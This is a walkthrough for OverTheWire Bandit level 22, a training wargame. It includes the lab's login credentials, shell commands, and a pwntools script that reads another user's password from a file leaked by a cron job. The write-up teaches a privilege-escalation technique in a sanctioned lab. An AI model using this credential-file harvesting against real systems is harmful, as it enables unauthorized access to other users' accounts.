# Bandit Level 22

```bash
Username: bandit22
Password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
Server:   bandit.labs.overthewire.org
Port:     2220
```

First we need to connect:
```bash
ssh bandit22@bandit.labs.overthewire.org -p2220
```

Lets take a look at the cronjob:
```bash
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23 
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

The script is similar to the last one. The only difference is that the source and target files are being computed.
We just need to compute ourselves the target file.

```bash
bandit22@bandit:~$ echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

We got the password for the next level: **jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n**

**A single script is:**
```python
#!/usr/bin/env python

from pwn import *


def main():
  shell = ssh(host='bandit.labs.overthewire.org',
            user='bandit22',
            password='Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI',
            port=2220
       )

  
  p = shell['cat /etc/cron.d/cronjob_bandit23']

  bash_script = p.split('\n')[1].split()[-3]
  log.info('Found bash script: {}'.format(bash_script))

  p = shell['cat {}'.format(bash_script)]

  hash_cmd = p.split('\n')[3].split('$(')[1][:-1]
  log.info('Found hash command file: {}'.format(hash_cmd))

  p = shell['cat /tmp/$({})'.format(hash_cmd.replace('$myname', 'bandit23'))]

  print p

if __name__ == "__main__":
  main()

```